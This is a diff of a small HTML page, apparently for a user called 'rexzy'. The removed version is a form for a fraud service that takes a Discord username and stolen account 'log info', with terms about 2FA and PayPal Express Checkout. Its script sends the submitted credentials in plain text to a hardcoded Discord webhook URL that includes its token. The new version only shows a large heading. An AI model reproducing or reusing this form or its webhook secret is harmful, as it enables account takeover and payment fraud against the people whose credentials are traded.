@@ -1,95 +1,27 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>rexzy</title>
+    <title>REXZY</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #121212;
-            color: white;
-            text-align: center;
-            padding: 20px;
+        /* CSS to center the text and make it full-screen */
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f0f0; /* Optional background color */
         }
-        .container {
-            max-width: 400px;
-            margin: auto;
-            background: #1e1e1e;
-            padding: 20px;
-            border-radius: 10px;
+
+        h1 {
+            font-size: 10vw; /* Adjusts font size to 10% of the viewport width */
+            margin: 0;
         }
-        input, textarea, button {
-            width: 100%;
-            margin-top: 10px;
-            padding: 10px;
-            border-radius: 5px;
-            border: none;
-            box-sizing: border-box;
-        }
-        button {
-            background-color: #007bff;
-            color: white;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: bold;
-        }
-        button:disabled {
-            background-color: gray;
-            cursor: not-allowed;
-        }
-        .hidden { display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>I'm currently offline so I will help you hit your log tomorrow. I also reccomend you try hitting it.</h2>
-        <input type="text" id="discordUser" placeholder="Enter Discord Username">
-        <textarea id="logInfo" placeholder="Enter Log Info"></textarea>
-        <button onclick="showToS()">Submit</button>
-        
-        <div id="tosSection" class="hidden">
-            <h3>Read This Before Continuing</h3>
-            <p><b>ToS:</b></p>
-            <p>1. I am doing my best, but I am not responsible if the log has 2FA.</p>
-            <p>2. The link you provide must have PayPal Express Checkout.</p>
-            <p>3. Log info must be sent in plain text.</p>
-            <p><i>Type "I accept the ToS" to continue.</i></p>
-            <input type="text" id="tosConfirm" placeholder="Type here...">
-            <button id="acceptBtn" onclick="submitForm()" disabled>I Accept the ToS</button>
-        </div>
-    </div>
 
-    <script>
-        function showToS() {
-            document.getElementById("tosSection").classList.remove("hidden");
-        }
+<h1>REXZY TYPE SHIT.</h1>
 
-        document.getElementById("tosConfirm").addEventListener("input", function() {
-            document.getElementById("acceptBtn").disabled = this.value !== "I accept the ToS";
-        });
-
-        function submitForm() {
-            const discordUser = document.getElementById("discordUser").value;
-            const logInfo = document.getElementById("logInfo").value;
-            const webhookUrl = "https://discord.com/api/webhooks/1343315467862933554/LB5K6hfDPBjJ2wKl_kU8ac6PCWoa_6On-W4k0AdFejk13w8jHxG9tNON7DtJpHOxMxKO";
-
-            if (!discordUser || !logInfo) {
-                alert("Fill in all fields before submitting.");
-                return;
-            }
-
-            const payload = {
-                content: `New Log Submission:\n**Discord Username:** ${discordUser}\n**Log Info:** ${logInfo}`
-            };
-
-            fetch(webhookUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            }).then(() => alert("Submitted successfully."))
-            .catch(() => alert("Error submitting data."));
-        }
-    </script>
 </body>
 </html>
